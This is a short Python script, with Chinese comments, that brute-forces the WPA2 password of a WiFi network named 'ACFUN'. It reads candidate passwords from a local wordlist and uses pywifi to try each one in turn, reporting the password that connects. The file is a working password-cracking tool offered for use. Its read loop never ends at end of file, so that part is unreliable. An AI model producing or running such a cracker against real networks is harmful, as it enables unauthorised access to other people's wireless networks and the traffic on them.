from gevent import monkey

monkey.patch_all()

import gevent
import time
import pywifi
from pywifi import const


def test_connect(password_str):
	wifi = pywifi.PyWiFi()  # 开启一个无线对象
	interface = wifi.interfaces()[0]  # 抓取无线网卡列表第一个无线网卡
	# print(wifi.interfaces())
	# print(interface.name())  # 取出无限网卡的名字

	interface.disconnect()  # 断开无线网卡连接
	time.sleep(3)  # 断开以后缓冲3秒

	profile = pywifi.Profile()  # 配置文件
	profile.ssid = "ACFUN"  # 就是wifi名称
	profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
	profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
	profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
	profile.key = password_str  # 测试密码成功或者失败

	interface.remove_all_network_profiles()  # 删除其他所有配置文件
	tmp_profile = interface.add_network_profile(profile)  # 加载配置文件

	interface.connect(tmp_profile)  # 连接
	time.sleep(5)  # 5秒内看是否可以链接上。
	isok = False  # 标识连接成功状态,初值为连接失败

	if interface.status() == const.IFACE_CONNECTED:  # 连接成功
		isok = True
		print("%s 连接成功,密码是:%s" % (profile.ssid, password_str))
	else:
		print("%s 连接失败,密码是:%s" % (profile.ssid, password_str))

	interface.disconnect()  # 断开连接
	time.sleep(1)
	return isok


def get_line(path):
	with open(path, 'r') as f:
		while True:
			res = f.readline().strip()
			if res:
				g1 = gevent.spawn(test_connect, res)  # 创建对象
				print('正在连接...,该密码是:%s' % res)
				g1.join()  # 等待
			else:
				print('空密码')


if __name__ == '__main__':
	file = r"E:\Python练习代码\PythonFile\分类练习\code_破解WiFi\pass1.txt"
	get_line(file)
